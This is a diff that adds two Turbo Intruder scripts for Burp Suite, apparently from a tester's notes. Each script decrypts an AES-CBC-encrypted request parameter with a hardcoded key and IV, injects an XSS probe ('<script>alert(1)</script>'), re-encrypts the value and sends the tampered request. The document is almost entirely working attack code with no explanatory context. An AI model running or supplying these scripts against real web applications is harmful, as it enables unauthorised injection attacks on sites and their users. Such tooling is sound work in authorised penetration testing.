@@ -126,3 +126,137 @@ data={}'''.format(new_encrypted_hex)
 
 def handleResponse(req, interesting):
     print(req.status, req.responseLength)
+
+
+
+Turbo Intuder2
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import pad, unpad
+import binascii
+import re
+
+def decrypt_aes_cbc(hex_data, key_str, iv_str):
+    key = key_str.encode('utf-8')
+    iv = iv_str.encode('utf-8')
+    cipher = AES.new(key, AES.MODE_CBC, iv)
+    decrypted = unpad(cipher.decrypt(binascii.unhexlify(hex_data)), AES.block_size)
+    return decrypted
+
+def encrypt_aes_cbc(plaintext_bytes, key_str, iv_str):
+    key = key_str.encode('utf-8')
+    iv = iv_str.encode('utf-8')
+    cipher = AES.new(key, AES.MODE_CBC, iv)
+    encrypted = cipher.encrypt(pad(plaintext_bytes, AES.block_size))
+    return binascii.hexlify(encrypted).decode()
+
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                           concurrentConnections=1,
+                           requestsPerConnection=1,
+                           pipeline=False)
+
+    key = '58945803628475210256298743257410'  # your key
+    iv = '2578018473365974'                  # your iv
+
+    # Get full original request
+    original_request = target.req.toBytes().decode()
+
+    # Extract encrypted hex from the URL
+    match = re.search(r'GET\s+/[^\s]*\?([a-fA-F0-9]+)', original_request)
+    if not match:
+        print("Encrypted hex in URL not found")
+        return
+
+    encrypted_hex = match.group(1)
+    decrypted = decrypt_aes_cbc(encrypted_hex, key, iv).decode(errors='ignore')
+    print("[+] Decrypted string:", decrypted)
+
+    # Parse decrypted query string
+    params = decrypted.split('&')
+    modified_params = []
+
+    for param in params:
+        if param.startswith('id='):
+            key_val = param.split('=', 1)
+            modified_value = key_val[1] + "<script>alert(1)</script>"
+            modified_params.append(f"id={modified_value}")
+        else:
+            modified_params.append(param)
+
+    modified_plaintext = '&'.join(modified_params)
+    print("[+] Modified plaintext:", modified_plaintext)
+
+    # Re-encrypt modified value
+    re_encrypted_hex = encrypt_aes_cbc(modified_plaintext.encode(), key, iv)
+    print("[+] Re-encrypted hex:", re_encrypted_hex)
+
+    # Replace the original encrypted value in the request URL
+    modified_request = original_request.replace(encrypted_hex, re_encrypted_hex)
+
+    # Send the modified request
+    engine.queue(target.req, modified_request.encode())
+
+def handleResponse(req, interesting):
+    print(f"Status: {req.status}, Length: {req.responseLength}")
+
+
+Turbo Intruder 3
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import pad, unpad
+import binascii
+import re
+
+# Decrypt AES CBC
+def decrypt_aes_cbc(hex_data, key_str, iv_str):
+    key = key_str.encode('utf-8')
+    iv = iv_str.encode('utf-8')
+    cipher = AES.new(key, AES.MODE_CBC, iv)
+    decrypted = unpad(cipher.decrypt(binascii.unhexlify(hex_data)), AES.block_size)
+    return decrypted
+
+# Encrypt AES CBC
+def encrypt_aes_cbc(plaintext_bytes, key_str, iv_str):
+    key = key_str.encode('utf-8')
+    iv = iv_str.encode('utf-8')
+    cipher = AES.new(key, AES.MODE_CBC, iv)
+    encrypted = cipher.encrypt(pad(plaintext_bytes, AES.block_size))
+    return binascii.hexlify(encrypted).decode()
+
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                           concurrentConnections=1,
+                           requestsPerConnection=1,
+                           pipeline=False)
+
+    key = '58945803628475210256298743257410'  # replace with yours
+    iv = '2578018473365974'                  # replace with yours
+
+    original = target.req.toBytes().decode()
+    
+    # Extract encrypted value using regex (you can adjust this as needed)
+    match = re.search(r'data=([a-fA-F0-9]+)', original)
+    if not match:
+        print("Encrypted data not found")
+        return
+
+    encrypted_hex = match.group(1)
+    decrypted = decrypt_aes_cbc(encrypted_hex, key, iv).decode(errors='ignore')
+    print('Decrypted:', decrypted)
+
+    # Modify decrypted data
+    modified = decrypted + '<script>alert(1)</script>'
+
+    # Re-encrypt
+    new_encrypted_hex = encrypt_aes_cbc(modified.encode(), key, iv)
+    print('New encrypted:', new_encrypted_hex)
+
+    # Replace original encrypted value in the request
+    modified_request = original.replace(encrypted_hex, new_encrypted_hex)
+
+    # Queue the modified request
+    engine.queue(target.req, modified_request.encode())
+
+def handleResponse(req, interesting):
+    print(req.status, req.responseLength)
+
+
